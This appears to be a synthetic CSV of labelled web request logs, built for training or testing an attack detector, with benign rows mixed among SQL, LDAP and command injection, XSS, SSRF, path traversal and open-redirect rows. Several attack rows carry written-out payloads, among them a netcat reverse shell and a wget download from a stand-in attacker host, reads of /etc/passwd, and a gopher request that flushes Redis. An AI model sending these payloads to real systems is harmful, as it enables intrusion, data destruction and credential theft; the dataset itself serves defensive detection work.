timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T14:54:36.823762,10.0.0.116,192.168.1.157,GET,10.0.0.50,/blog/category/tech,,http://10.0.0.50/blog/category/tech,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:31:00.249938,172.16.0.103,10.0.0.38,POST,10.0.0.50,/admin,user=admin' AND '1'='1,https://10.0.0.50/admin?user=admin' AND '1'='1,wfuzz/3.1.0,sql_injection,1
2026-04-07T14:58:05.588212,192.168.1.162,10.0.0.243,GET,shop.example.com,/api/user,username=admin%29%28%26%29,http://shop.example.com/api/user?username=admin%29%28%26%29,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),ldap_injection,1
2026-04-07T14:59:57.406252,172.16.0.36,10.0.0.7,GET,api.example.com,/ldap,uid=%2A%29%28uid%3Dadmin%29%29,http://api.example.com/ldap?uid=%2A%29%28uid%3Dadmin%29%29,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",ldap_injection,1
2026-04-07T13:59:17.949282,172.16.0.58,192.168.1.168,GET,webapp.internal,/news,format=json,http://webapp.internal/news?format=json,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:40:34.196467,10.0.0.112,172.16.0.198,HEAD,example.com,/register,status=active&sort=asc&category=electronics,http://example.com/register?status=active&sort=asc&category=electronics,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:10:48.048365,192.168.1.243,172.16.0.23,GET,webapp.internal,/goto,url=https%3A%2F%2Fevil.com%40legitimate.com,http://webapp.internal/goto?url=https%3A%2F%2Fevil.com%40legitimate.com,python-requests/2.31.0,open_redirect,1
2026-04-07T14:07:52.606628,192.168.1.2,172.16.0.59,GET,10.0.0.50,/ldap,uid=admin%29%28%26%29,https://10.0.0.50/ldap?uid=admin%29%28%26%29,dirbuster,ldap_injection,1
2026-04-07T14:27:51.515649,10.0.0.238,172.16.0.184,GET,192.168.1.100,/settings,order=name,http://192.168.1.100/settings?order=name,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:21:51.063283,192.168.1.100,10.0.0.242,GET,api.example.com,/blog/category/tech,view=list&order=name,http://api.example.com/blog/category/tech?view=list&order=name,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:35:07.226401,10.0.0.111,172.16.0.103,GET,webapp.internal,/goto,url=http%3A%2F%2Fevil.com,https://webapp.internal/goto?url=http%3A%2F%2Fevil.com,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",open_redirect,1
2026-04-07T14:24:30.931752,10.0.0.51,172.16.0.49,GET,example.com,/download/....//....//....//var/www/html/config.php,,http://example.com/download/....//....//....//var/www/html/config.php,python-requests/2.31.0,path_traversal,1
2026-04-07T14:16:42.048948,10.0.0.150,172.16.0.57,HEAD,shop.example.com,/api/orders,order=name,http://shop.example.com/api/orders?order=name,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:36:24.496141,172.16.0.3,192.168.1.100,GET,api.example.com,/api/user,cn=admin%2A,http://api.example.com/api/user?cn=admin%2A,ZAP/2.14.0,ldap_injection,1
2026-04-07T14:31:22.104610,10.0.0.148,192.168.1.5,GET,192.168.1.100,/blog,,http://192.168.1.100/blog,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:54:53.268131,192.168.1.81,172.16.0.193,GET,192.168.1.100,/link,next=%2F%2F%2Fevil.com,http://192.168.1.100/link?next=%2F%2F%2Fevil.com,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,open_redirect,1
2026-04-07T14:16:59.746434,10.0.0.21,10.0.0.59,GET,shop.example.com,/api/execute,exec=test$(sleep 10),https://shop.example.com/api/execute?exec=test$(sleep 10),ZAP/2.14.0,command_injection,1
2026-04-07T13:36:00.754326,172.16.0.208,172.16.0.242,GET,secure.example.com,/ldap,uid=%2A%29%28objectClass%3D%2A,http://secure.example.com/ldap?uid=%2A%29%28objectClass%3D%2A,nuclei,ldap_injection,1
2026-04-07T14:40:39.389303,10.0.0.105,172.16.0.233,GET,10.0.0.50,/search,,http://10.0.0.50/search,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:44:14.658410,192.168.1.138,10.0.0.69,POST,10.0.0.50,/css/style.css,brand=apple,http://10.0.0.50/css/style.css?brand=apple,curl/8.4.0,benign,0
2026-04-07T13:33:02.015203,10.0.0.238,172.16.0.148,HEAD,secure.example.com,/js/main.js,brand=apple&view=list&lang=en,http://secure.example.com/js/main.js?brand=apple&view=list&lang=en,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:39:51.972040,172.16.0.129,10.0.0.141,POST,example.com,/api/users,order=name&view=list&category=electronics,http://example.com/api/users?order=name&view=list&category=electronics,curl/8.4.0,benign,0
2026-04-07T13:26:50.476264,172.16.0.80,192.168.1.88,GET,example.com,/url,url=%2F%2Fevil.com%2Fpath,https://example.com/url?url=%2F%2Fevil.com%2Fpath,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",open_redirect,1
2026-04-07T15:04:22.800020,172.16.0.249,10.0.0.249,GET,secure.example.com,/contact,,http://secure.example.com/contact,curl/8.4.0,benign,0
2026-04-07T14:42:57.344321,172.16.0.83,172.16.0.129,GET,webapp.internal,/api/user,cn=%2A%28%29%7C%2526%27,https://webapp.internal/api/user?cn=%2A%28%29%7C%2526%27,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),ldap_injection,1
2026-04-07T14:40:41.265484,172.16.0.127,172.16.0.65,GET,test-app.local,/events,,http://test-app.local/events,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:42:27.221147,172.16.0.30,192.168.1.151,GET,test-app.local,/search,name=<a href='javascript:alert(1)'>click</a>,https://test-app.local/search?name=<a href='javascript:alert(1)'>click</a>,gobuster/3.6,xss,1
2026-04-07T13:41:28.683625,10.0.0.57,192.168.1.41,GET,10.0.0.50,/privacy,lang=en&id=123,https://10.0.0.50/privacy?lang=en&id=123,curl/8.4.0,benign,0
2026-04-07T13:27:29.647620,10.0.0.34,172.16.0.38,GET,secure.example.com,/register,lang=en&view=list&category=electronics,http://secure.example.com/register?lang=en&view=list&category=electronics,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:34:31.408624,192.168.1.18,10.0.0.249,POST,admin.example.com,/api/v1/status,,http://admin.example.com/api/v1/status,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:11:27.634050,10.0.0.236,10.0.0.46,GET,webapp.internal,/profile,message=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,http://webapp.internal/profile?message=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,gobuster/3.6,xss,1
2026-04-07T13:53:56.363107,10.0.0.157,10.0.0.136,GET,api.example.com,/api/fetch,fetch=dict%3A%2F%2Flocalhost%3A11211%2Fstat,https://api.example.com/api/fetch?fetch=dict%3A%2F%2Flocalhost%3A11211%2Fstat,sqlmap/1.7.12#dev,ssrf,1
2026-04-07T14:42:29.441756,192.168.1.57,192.168.1.113,GET,shop.example.com,/blog/category/tech,,https://shop.example.com/blog/category/tech,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T15:01:16.055374,10.0.0.170,10.0.0.246,POST,webapp.internal,/search,search=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,http://webapp.internal/search?search=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,Nmap Scripting Engine,xss,1
2026-04-07T13:48:12.971954,172.16.0.26,192.168.1.226,HEAD,example.com,/about,,http://example.com/about,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:57:47.703023,10.0.0.168,192.168.1.131,POST,admin.example.com,/comment,search=<script>alert('XSS')</script>,http://admin.example.com/comment?search=<script>alert('XSS')</script>,masscan/1.3,xss,1
2026-04-07T14:58:34.397403,172.16.0.204,192.168.1.239,GET,test-app.local,/load,src=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,http://test-app.local/load?src=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",ssrf,1
2026-04-07T14:16:00.682559,192.168.1.182,192.168.1.117,GET,10.0.0.50,/index.html,,http://10.0.0.50/index.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:28:05.656899,172.16.0.142,192.168.1.220,GET,192.168.1.100,/directory,username=%2A%28%29%7C%2526%27,https://192.168.1.100/directory?username=%2A%28%29%7C%2526%27,burpsuite,ldap_injection,1
2026-04-07T14:29:10.781510,10.0.0.96,172.16.0.9,HEAD,test-app.local,/notifications,,https://test-app.local/notifications,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:14:31.969989,10.0.0.187,10.0.0.117,POST,192.168.1.100,/register,,http://192.168.1.100/register,python-requests/2.31.0,benign,0
2026-04-07T14:14:23.651599,10.0.0.192,10.0.0.3,GET,example.com,/lookup,ip=test| cat /etc/passwd,http://example.com/lookup?ip=test| cat /etc/passwd,wfuzz/3.1.0,command_injection,1
2026-04-07T13:57:10.186043,192.168.1.186,192.168.1.88,GET,secure.example.com,/download/..%c0%af..%c0%af..%c0%afetc/passwd,,http://secure.example.com/download/..%c0%af..%c0%af..%c0%afetc/passwd,nuclei,path_traversal,1
2026-04-07T14:20:49.654750,10.0.0.46,10.0.0.28,HEAD,test-app.local,/contact,page=1&limit=10,http://test-app.local/contact?page=1&limit=10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:42:55.745829,192.168.1.213,172.16.0.157,HEAD,admin.example.com,/about,order=name&brand=apple,http://admin.example.com/about?order=name&brand=apple,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:51:01.942157,10.0.0.53,172.16.0.127,GET,admin.example.com,/,limit=10&id=123&brand=apple,http://admin.example.com/?limit=10&id=123&brand=apple,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:59:29.384964,192.168.1.242,10.0.0.113,GET,api.example.com,/fetch,path=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,http://api.example.com/fetch?path=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,nuclei,ssrf,1
2026-04-07T14:34:28.883213,10.0.0.74,172.16.0.78,POST,shop.example.com,/admin/run,cmd=test| nc attacker.com 4444 -e /bin/sh,http://shop.example.com/admin/run?cmd=test| nc attacker.com 4444 -e /bin/sh,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",command_injection,1
2026-04-07T14:25:11.268601,10.0.0.25,192.168.1.27,GET,example.com,/file,template=../../../var/log/auth.log,http://example.com/file?template=../../../var/log/auth.log,wfuzz/3.1.0,path_traversal,1
2026-04-07T14:45:22.615329,10.0.0.11,10.0.0.135,HEAD,api.example.com,/search,,http://api.example.com/search,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:36:25.881184,10.0.0.156,10.0.0.132,POST,secure.example.com,/products,to=2024-12-31&limit=10,http://secure.example.com/products?to=2024-12-31&limit=10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:21:04.459389,10.0.0.82,172.16.0.39,GET,example.com,/image,uri=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http://example.com/image?uri=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,python-requests/2.31.0,ssrf,1
2026-04-07T13:29:46.244846,10.0.0.104,10.0.0.245,POST,api.example.com,/api/v2/data,,http://api.example.com/api/v2/data,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:46:07.253695,10.0.0.186,10.0.0.82,GET,api.example.com,/api/v1/health,order=name&filter=recent&limit=10,https://api.example.com/api/v1/health?order=name&filter=recent&limit=10,curl/8.4.0,benign,0
2026-04-07T14:43:39.721884,192.168.1.133,192.168.1.66,GET,example.com,/profile,,http://example.com/profile,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:40:16.806892,192.168.1.185,192.168.1.3,GET,test-app.local,/css/style.css,,http://test-app.local/css/style.css,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:28:12.830802,192.168.1.38,10.0.0.142,GET,192.168.1.100,/directory,username=admin%29%28%21%28%26%281%3D0,https://192.168.1.100/directory?username=admin%29%28%21%28%26%281%3D0,sqlmap/1.7.12#dev,ldap_injection,1
2026-04-07T14:32:26.496190,192.168.1.248,10.0.0.38,HEAD,test-app.local,/terms,q=laptop&filter=recent&brand=apple,http://test-app.local/terms?q=laptop&filter=recent&brand=apple,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:44:43.060787,10.0.0.81,10.0.0.32,GET,example.com,/dashboard,,http://example.com/dashboard,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:48:09.740522,172.16.0.96,172.16.0.234,GET,api.example.com,/search,format=json,http://api.example.com/search?format=json,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:08:15.031652,10.0.0.134,10.0.0.157,GET,shop.example.com,/login,sort=asc&brand=apple,http://shop.example.com/login?sort=asc&brand=apple,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:12:34.398911,172.16.0.239,10.0.0.198,GET,secure.example.com,/blog,category=electronics,https://secure.example.com/blog?category=electronics,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:56:46.864242,192.168.1.197,10.0.0.159,POST,webapp.internal,/js/main.js,,https://webapp.internal/js/main.js,curl/8.4.0,benign,0
2026-04-07T14:16:48.939167,172.16.0.191,192.168.1.249,POST,secure.example.com,/profile,input='-alert(1)-',http://secure.example.com/profile?input='-alert(1)-',"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",xss,1
2026-04-07T14:50:22.759999,192.168.1.205,192.168.1.72,POST,shop.example.com,/events,,https://shop.example.com/events,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:28:41.372909,192.168.1.224,192.168.1.194,POST,192.168.1.100,/about,,https://192.168.1.100/about,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:13:18.393827,192.168.1.181,172.16.0.112,GET,secure.example.com,/news,sort=asc&order=name&filter=recent,https://secure.example.com/news?sort=asc&order=name&filter=recent,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:55:31.016880,10.0.0.127,10.0.0.222,GET,shop.example.com,/privacy,,http://shop.example.com/privacy,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:19:29.194157,172.16.0.13,10.0.0.39,GET,test-app.local,/search,filter=admin%2A,https://test-app.local/search?filter=admin%2A,python-requests/2.31.0,ldap_injection,1
2026-04-07T14:26:35.073900,10.0.0.160,10.0.0.163,GET,192.168.1.100,/settings,,https://192.168.1.100/settings,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:44:16.136120,172.16.0.124,192.168.1.233,POST,api.example.com,/blog/post/1,type=product&from=2024-01-01&brand=apple,http://api.example.com/blog/post/1?type=product&from=2024-01-01&brand=apple,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:24:56.873083,172.16.0.134,192.168.1.34,HEAD,shop.example.com,/cart,sort=asc&type=product&status=active,https://shop.example.com/cart?sort=asc&type=product&status=active,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:42:34.776903,10.0.0.49,192.168.1.55,GET,test-app.local,/api/v1/health,,http://test-app.local/api/v1/health,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:31:20.824423,192.168.1.208,192.168.1.2,GET,test-app.local,/notifications,order=name&from=2024-01-01,https://test-app.local/notifications?order=name&from=2024-01-01,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:48:55.564325,10.0.0.194,10.0.0.33,GET,admin.example.com,/api/execute,cmd=test&& wget http://attacker.com/shell.sh,https://admin.example.com/api/execute?cmd=test&& wget http://attacker.com/shell.sh,nikto/2.5.0,command_injection,1
2026-04-07T14:15:54.865229,10.0.0.239,172.16.0.165,POST,secure.example.com,/logout,id=123,https://secure.example.com/logout?id=123,python-requests/2.31.0,benign,0
2026-04-07T13:30:25.903417,10.0.0.242,10.0.0.210,GET,secure.example.com,/download,page=....\....\....\etc\passwd,http://secure.example.com/download?page=....\....\....\etc\passwd,nuclei,path_traversal,1
2026-04-07T15:05:56.116815,172.16.0.143,10.0.0.233,GET,admin.example.com,/api/v1/health,,http://admin.example.com/api/v1/health,python-requests/2.31.0,benign,0
2026-04-07T14:18:40.609797,172.16.0.108,10.0.0.124,POST,example.com,/logout,,http://example.com/logout,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T15:07:45.285142,172.16.0.134,192.168.1.11,HEAD,shop.example.com,/settings,,https://shop.example.com/settings,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:26:00.462171,172.16.0.154,10.0.0.153,HEAD,webapp.internal,/contact,limit=10&status=active&filter=recent,http://webapp.internal/contact?limit=10&status=active&filter=recent,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:05:23.350312,172.16.0.128,172.16.0.131,GET,api.example.com,/api/v2/data,lang=en&user=john&category=electronics,https://api.example.com/api/v2/data?lang=en&user=john&category=electronics,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:41:32.791314,172.16.0.218,192.168.1.41,GET,192.168.1.100,/products,category=1%27%20ORDER%20BY%2010--,http://192.168.1.100/products?category=1%27%20ORDER%20BY%2010--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",sql_injection,1
2026-04-07T13:45:58.386999,10.0.0.36,10.0.0.141,GET,shop.example.com,/news,format=json&filter=recent&page=1,http://shop.example.com/news?format=json&filter=recent&page=1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T15:08:35.967852,172.16.0.178,172.16.0.217,GET,test-app.local,/products,type=product&status=active&id=123,http://test-app.local/products?type=product&status=active&id=123,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:06:44.215884,192.168.1.137,192.168.1.241,GET,192.168.1.100,/css/style.css,category=electronics&from=2024-01-01&page=1,https://192.168.1.100/css/style.css?category=electronics&from=2024-01-01&page=1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
